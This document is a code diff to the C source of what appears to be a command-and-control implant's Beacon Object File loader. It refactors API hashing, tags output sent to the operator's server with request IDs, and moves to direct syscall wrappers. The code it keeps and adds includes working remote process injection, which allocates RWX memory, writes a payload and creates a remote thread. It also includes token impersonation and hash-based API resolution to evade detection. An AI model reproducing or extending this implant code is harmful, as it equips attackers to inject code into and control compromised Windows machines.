@@ -5,15 +5,12 @@
 #include <Demon.h>
 
 #include <Core/Command.h>
-#include <Core/WinUtils.h>
+#include <Core/Win32.h>
 #include <Core/MiniStd.h>
 #include <Core/Package.h>
 #include "Common/Defines.h"
 
 #include <Loader/ObjectApi.h>
-
-#define intAlloc( size )    Instance.Win32.LocalAlloc( LPTR, size )
-#define intFree( addr )     Instance.Win32.LocalFree( addr )
 
 #ifndef bufsize
 #define bufsize 8192
@@ -28,8 +25,8 @@ PVOID LdrModulePebString( PCHAR ModuleString )
 
 PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )
 {
-    PRINTF( "Module:[%p] Function:[%s : %lx]\n", Module, Function, HashStringA( Function ) )
-    return LdrFunctionAddr( Module, HashStringA( Function ) );
+    PRINTF( "Module:[%p] Function:[%s : %lx]\n", Module, Function, HashEx( Function, 0, TRUE ) )
+    return LdrFunctionAddr( Module, HashEx( Function, 0, TRUE ) );
 }
 
 BOOL LdrFreeLibrary( HMODULE hLibModule )
@@ -43,40 +40,40 @@ HLOCAL LdrLocalFree( PVOID hMem )
 }
 
 COFFAPIFUNC BeaconApi[] = {
-        { .NameHash = COFFAPI_BEACONDATAPARSER,             .Pointer = BeaconDataParse                  },
-        { .NameHash = COFFAPI_BEACONDATAINT,                .Pointer = BeaconDataInt                    },
-        { .NameHash = COFFAPI_BEACONDATASHORT,              .Pointer = BeaconDataShort                  },
-        { .NameHash = COFFAPI_BEACONDATALENGTH,             .Pointer = BeaconDataLength                 },
-        { .NameHash = COFFAPI_BEACONDATAEXTRACT,            .Pointer = BeaconDataExtract                },
-        { .NameHash = COFFAPI_BEACONFORMATALLOC,            .Pointer = BeaconFormatAlloc                },
-        { .NameHash = COFFAPI_BEACONFORMATRESET,            .Pointer = BeaconFormatReset                },
-        { .NameHash = COFFAPI_BEACONFORMATFREE,             .Pointer = BeaconFormatFree                 },
-        { .NameHash = COFFAPI_BEACONFORMATAPPEND,           .Pointer = BeaconFormatAppend               },
-        { .NameHash = COFFAPI_BEACONFORMATPRINTF,           .Pointer = BeaconFormatPrintf               },
-        { .NameHash = COFFAPI_BEACONFORMATTOSTRING,         .Pointer = BeaconFormatToString             },
-        { .NameHash = COFFAPI_BEACONFORMATINT,              .Pointer = BeaconFormatInt                  },
-        { .NameHash = COFFAPI_BEACONPRINTF,                 .Pointer = BeaconPrintf                     },
-        { .NameHash = COFFAPI_BEACONOUTPUT,                 .Pointer = BeaconOutput                     },
-        { .NameHash = COFFAPI_BEACONUSETOKEN,               .Pointer = BeaconUseToken                   },
-        { .NameHash = COFFAPI_BEACONREVERTTOKEN,            .Pointer = BeaconRevertToken                },
-        { .NameHash = COFFAPI_BEACONISADMIN,                .Pointer = BeaconIsAdmin                    },
-        { .NameHash = COFFAPI_BEACONGETSPAWNTO,             .Pointer = BeaconGetSpawnTo                 },
-        { .NameHash = COFFAPI_BEACONINJECTPROCESS,          .Pointer = BeaconInjectProcess              },
-        { .NameHash = COFFAPI_BEACONSPAWNTEMPORARYPROCESS,  .Pointer = BeaconSpawnTemporaryProcess      },
-        { .NameHash = COFFAPI_BEACONINJECTTEMPORARYPROCESS, .Pointer = BeaconInjectTemporaryProcess     },
-        { .NameHash = COFFAPI_BEACONCLEANUPPROCESS,         .Pointer = BeaconCleanupProcess             },
+        { .NameHash = H_COFFAPI_BEACONDATAPARSER,             .Pointer = BeaconDataParse                  },
+        { .NameHash = H_COFFAPI_BEACONDATAINT,                .Pointer = BeaconDataInt                    },
+        { .NameHash = H_COFFAPI_BEACONDATASHORT,              .Pointer = BeaconDataShort                  },
+        { .NameHash = H_COFFAPI_BEACONDATALENGTH,             .Pointer = BeaconDataLength                 },
+        { .NameHash = H_COFFAPI_BEACONDATAEXTRACT,            .Pointer = BeaconDataExtract                },
+        { .NameHash = H_COFFAPI_BEACONFORMATALLOC,            .Pointer = BeaconFormatAlloc                },
+        { .NameHash = H_COFFAPI_BEACONFORMATRESET,            .Pointer = BeaconFormatReset                },
+        { .NameHash = H_COFFAPI_BEACONFORMATFREE,             .Pointer = BeaconFormatFree                 },
+        { .NameHash = H_COFFAPI_BEACONFORMATAPPEND,           .Pointer = BeaconFormatAppend               },
+        { .NameHash = H_COFFAPI_BEACONFORMATPRINTF,           .Pointer = BeaconFormatPrintf               },
+        { .NameHash = H_COFFAPI_BEACONFORMATTOSTRING,         .Pointer = BeaconFormatToString             },
+        { .NameHash = H_COFFAPI_BEACONFORMATINT,              .Pointer = BeaconFormatInt                  },
+        { .NameHash = H_COFFAPI_BEACONPRINTF,                 .Pointer = BeaconPrintf                     },
+        { .NameHash = H_COFFAPI_BEACONOUTPUT,                 .Pointer = BeaconOutput                     },
+        { .NameHash = H_COFFAPI_BEACONUSETOKEN,               .Pointer = BeaconUseToken                   },
+        { .NameHash = H_COFFAPI_BEACONREVERTTOKEN,            .Pointer = TokenRevSelf                     },
+        { .NameHash = H_COFFAPI_BEACONISADMIN,                .Pointer = BeaconIsAdmin                    },
+        { .NameHash = H_COFFAPI_BEACONGETSPAWNTO,             .Pointer = BeaconGetSpawnTo                 },
+        { .NameHash = H_COFFAPI_BEACONINJECTPROCESS,          .Pointer = BeaconInjectProcess              },
+        { .NameHash = H_COFFAPI_BEACONSPAWNTEMPORARYPROCESS,  .Pointer = BeaconSpawnTemporaryProcess      },
+        { .NameHash = H_COFFAPI_BEACONINJECTTEMPORARYPROCESS, .Pointer = BeaconInjectTemporaryProcess     },
+        { .NameHash = H_COFFAPI_BEACONCLEANUPPROCESS,         .Pointer = BeaconCleanupProcess             },
 
         // End of array
         { .NameHash = 0, .Pointer = NULL },
 };
 
 COFFAPIFUNC LdrApi[] = {
-        { .NameHash = COFFAPI_TOWIDECHAR,                   .Pointer = toWideChar                       },
-        { .NameHash = COFFAPI_LOADLIBRARYA,                 .Pointer = LdrModuleLoad                    },
-        { .NameHash = COFFAPI_GETMODULEHANDLE,              .Pointer = LdrModulePebString               },
-        { .NameHash = COFFAPI_GETPROCADDRESS,               .Pointer = LdrFunctionAddrString            },
-        { .NameHash = COFFAPI_FREELIBRARY,                  .Pointer = LdrFreeLibrary                   },
-        { .NameHash = COFFAPI_LOCALFREE,                    .Pointer = LdrLocalFree                     },
+        { .NameHash = H_COFFAPI_TOWIDECHAR,                   .Pointer = toWideChar                       },
+        { .NameHash = H_COFFAPI_LOADLIBRARYA,                 .Pointer = LdrModuleLoad                    },
+        { .NameHash = H_COFFAPI_GETMODULEHANDLE,              .Pointer = LdrModulePebString               },
+        { .NameHash = H_COFFAPI_GETPROCADDRESS,               .Pointer = LdrFunctionAddrString            },
+        { .NameHash = H_COFFAPI_FREELIBRARY,                  .Pointer = LdrFreeLibrary                   },
+        { .NameHash = H_COFFAPI_LOCALFREE,                    .Pointer = LdrLocalFree                     },
 
         // End of array
         { .NameHash = 0, .Pointer = NULL },
@@ -167,14 +164,53 @@ PCHAR BeaconDataExtract( PDATA parser, PINT size )
     return Data;
 }
 
+/*
+ * This function is called by BeaconPrintf and BeaconOutput.
+ * It loops over all the COFFEE structs saved on the Instance object
+ * trying to find which BOF called BeaconPrintf/BeaconOutput
+ * once it finds it, it returns the RequestID
+ * this is so that the TS can identify which BOF is sending the output data.
+ * This is needed because you can have more than one BOF mapped in memory at the same time
+ */
+BOOL GetRequestIDForCallingObjectFile( PVOID CoffeeFunctionReturn, PUINT32 RequestID )
+{
+    PCOFFEE Entry = Instance.Coffees;
+
+    if ( ! CoffeeFunctionReturn || ! RequestID )
+        return FALSE;
+
+    while ( Entry )
+    {
+        if ( ( ULONG_PTR ) CoffeeFunctionReturn >= ( ULONG_PTR ) Entry->ImageBase && ( ULONG_PTR ) CoffeeFunctionReturn < ( ( ULONG_PTR ) Entry->ImageBase + Entry->BofSize ) )
+        {
+            PRINTF( "Found the RequestID for the calling BOF: %x\n", Entry->RequestID )
+            *RequestID = Entry->RequestID;
+            return TRUE;
+        }
+
+        Entry = Entry->Next;
+    }
+
+    PUTS( "Failed to find the RequestID for the calling BOF" )
+
+    return FALSE;
+}
+
 VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
 {
     PRINTF( "BeaconPrintf( %d, %x, ... )\n", Type, fmt )
 
-    PPACKAGE    package         = PackageCreate( BEACON_OUTPUT );
-    va_list     VaListArg       = 0;
-    PVOID       CallbackOutput  = NULL;
-    INT         CallbackSize    = 0;
+    PPACKAGE    package              = NULL;
+    va_list     VaListArg            = 0;
+    PVOID       CallbackOutput       = NULL;
+    INT         CallbackSize         = 0;
+    UINT32      RequestID            = 0;
+    PVOID       CoffeeFunctionReturn = __builtin_return_address( 0 );
+
+    if ( GetRequestIDForCallingObjectFile( CoffeeFunctionReturn, &RequestID ) )
+        package = PackageCreateWithRequestID( BEACON_OUTPUT, RequestID );
+    else
+        package = PackageCreate( BEACON_OUTPUT );
 
     va_start( VaListArg, fmt );
 
@@ -189,7 +225,7 @@ VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
 
     PackageAddInt32( package, Type );
     PackageAddBytes( package, CallbackOutput, CallbackSize );
-    PackageTransmit( package, NULL, NULL );
+    PackageTransmit( package );
 
     MemSet( CallbackOutput, 0, CallbackSize );
     Instance.Win32.LocalFree( CallbackOutput );
@@ -199,37 +235,38 @@ VOID BeaconOutput( INT Type, PCHAR data, INT len )
 {
     PRINTF( "BeaconOutput( %d, %p, %d )\n", Type, data, len )
 
-    PPACKAGE Package = PackageCreate( BEACON_OUTPUT );
+    UINT32   RequestID            = 0;
+    PPACKAGE Package              = NULL;
+    PVOID    CoffeeFunctionReturn = __builtin_return_address( 0 );
+
+    if ( GetRequestIDForCallingObjectFile( CoffeeFunctionReturn, &RequestID ) ) {
+        Package = PackageCreateWithRequestID( BEACON_OUTPUT, RequestID );
+    } else {
+        Package = PackageCreate( BEACON_OUTPUT );
+    }
 
     PackageAddInt32( Package, Type );
-
     PackageAddBytes( Package, ( PBYTE ) data, len );
-
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
-BOOL BeaconIsAdmin()
-{
-    HANDLE          hToken    = NULL;
-    TOKEN_ELEVATION Elevation = { 0 };
-    DWORD           cbSize    = sizeof( TOKEN_ELEVATION );
-    NTSTATUS        NtStatus  = STATUS_SUCCESS;
+BOOL BeaconIsAdmin(
+    VOID
+) {
+    HANDLE Token = { 0 };
+    BOOL   Admin = FALSE;
 
-    if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken ) ) )
-    {
-        if ( Instance.Win32.GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) )
-        {
-            Instance.Win32.NtClose( hToken );
-            return ( BOOL ) Elevation.TokenIsElevated;
-        }
-        else PRINTF( "GetTokenInformation: Failed [%d]\n", NtGetLastError() );
+    /* query if current process token is elevated or not */
+    if ( ( Token = TokenCurrentHandle() ) ) {
+        Admin = TokenElevated( Token );
     }
-    else PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
 
-    if ( hToken )
-        Instance.Win32.NtClose( hToken );
+    /* close token handle */
+    if ( Token ) {
+        SysNtClose( Token );
+    }
 
-    return FALSE;
+    return Admin;
 }
 
 VOID BeaconFormatAlloc( PFORMAT format, int maxsz )
@@ -318,20 +355,15 @@ BOOL BeaconUseToken( HANDLE token )
 {
     HANDLE hImpersonateToken = INVALID_HANDLE_VALUE;
 
-    if (!Instance.Syscall.NtDuplicateToken(token, 0, NULL, FALSE, TokenPrimary, &hImpersonateToken)) {
+    if ( ! SysNtDuplicateToken( token, 0, NULL, FALSE, TokenPrimary, &hImpersonateToken ) ) {
         return FALSE;
     }
 
-    if (!Instance.Win32.SetThreadToken(NULL, hImpersonateToken)) {
+    if ( ! Instance.Win32.SetThreadToken( NULL, hImpersonateToken ) ) {
         return FALSE;
     }
 
     return TRUE;
-}
-
-VOID BeaconRevertToken( VOID )
-{
-    Instance.Win32.RevertToSelf();
 }
 
 VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
@@ -342,15 +374,17 @@ VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
     if ( ! buffer )
         return;
 
-    if ( x86 )
+    if ( x86 ) {
         Path = Instance.Config.Process.Spawn86;
-    else
+    } else {
         Path = Instance.Config.Process.Spawn64;
+    }
 
     Size = StringLengthW( Path ) * sizeof( WCHAR );
 
-    if ( Size > length )
+    if ( Size > length ) {
         return;
+    }
 
     MemCopy( buffer, Path, Size );
 }
@@ -390,39 +424,34 @@ VOID BeaconInjectProcess( HANDLE hProc, int pid, char* payload, int p_len, int p
 
     InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );
 
-    if ( ! hProc )
-    {
-        ClientID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) pid;
-        ClientID.UniqueThread  = ( HANDLE ) 0;
-        Status = Instance.Syscall.NtOpenProcess( &hProc, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientID );
-        if ( ! NT_SUCCESS( Status ) )
-        {
-            // BeaconInjectProcess does not seem to signal errors...
+    if ( ! hProc ) {
+        hProc = ProcessOpen( pid, PROCESS_ALL_ACCESS );
+        if ( ! hProc ) {
             return;
         }
     }
 
     // allocate memory space for payload
     Size = p_len * sizeof( CHAR );
-    Status = Instance.Syscall.NtAllocateVirtualMemory(hProc, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    Status = SysNtAllocateVirtualMemory(hProc, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if ( ! NT_SUCCESS( Status ) )
         return;
 
-    Status = Instance.Syscall.NtWriteVirtualMemory(hProc, p_RemoteBuf, (PVOID)payload, Size, 0);
+    Status = SysNtWriteVirtualMemory(hProc, p_RemoteBuf, (PVOID)payload, Size, 0);
     if ( ! NT_SUCCESS( Status ) )
         return;
 
     // allocate memory space for argument
     Size = a_len * sizeof( CHAR );
-    Status = Instance.Syscall.NtAllocateVirtualMemory(hProc, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    Status = SysNtAllocateVirtualMemory(hProc, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if ( ! NT_SUCCESS( Status ) )
         return;
 
-    Status = Instance.Syscall.NtWriteVirtualMemory(hProc, a_RemoteBuf, (PVOID)arg, Size, 0);
+    Status = SysNtWriteVirtualMemory(hProc, a_RemoteBuf, (PVOID)arg, Size, 0);
     if ( ! NT_SUCCESS( Status ) )
         return;
 
-    Status = Instance.Syscall.NtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, hProc, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
+    Status = SysNtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, hProc, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
     if ( ! NT_SUCCESS( Status ) )
         return;
 }
@@ -436,40 +465,40 @@ VOID BeaconInjectTemporaryProcess( PROCESS_INFORMATION* pInfo, char* payload, in
 
     // allocate memory space for payload
     Size = p_len * sizeof(char);
-    Status = Instance.Syscall.NtAllocateVirtualMemory(pInfo->hProcess, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    Status = SysNtAllocateVirtualMemory(pInfo->hProcess, &p_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if (Status != STATUS_SUCCESS) {
         return;
     }
 
-    Status = Instance.Syscall.NtWriteVirtualMemory(pInfo->hProcess, p_RemoteBuf, (PVOID)payload, Size, 0);
+    Status = SysNtWriteVirtualMemory(pInfo->hProcess, p_RemoteBuf, (PVOID)payload, Size, 0);
     if (Status != STATUS_SUCCESS) {
         return;
     }
 
     // allocate memory space for argument
     Size = a_len * sizeof(char);
-    Status = Instance.Syscall.NtAllocateVirtualMemory(pInfo->hProcess, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    Status = SysNtAllocateVirtualMemory(pInfo->hProcess, &a_RemoteBuf, 0, &Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if (Status != STATUS_SUCCESS) {
         return;
     }
 
-    Status = Instance.Syscall.NtWriteVirtualMemory(pInfo->hProcess, a_RemoteBuf, (PVOID)arg, Size, 0);
+    Status = SysNtWriteVirtualMemory(pInfo->hProcess, a_RemoteBuf, (PVOID)arg, Size, 0);
     if (Status != STATUS_SUCCESS) {
         return;
     }
 
-    Instance.Syscall.NtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, pInfo->hProcess, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
+    SysNtCreateThreadEx(NULL, GENERIC_EXECUTE, NULL, pInfo->hProcess, (LPTHREAD_START_ROUTINE)(p_RemoteBuf + p_offset), a_RemoteBuf, FALSE, 0, 0, 0, NULL);
 }
 
 VOID BeaconCleanupProcess( PROCESS_INFORMATION* pInfo )
 {
     NTSTATUS status;
 
-    status = Instance.Win32.NtClose(pInfo->hProcess);
+    status = SysNtClose(pInfo->hProcess);
     if (status != STATUS_SUCCESS)
         return;
 
-    status = Instance.Win32.NtClose(pInfo->hThread);
+    status = SysNtClose(pInfo->hThread);
     if (status != STATUS_SUCCESS)
         return;
 }
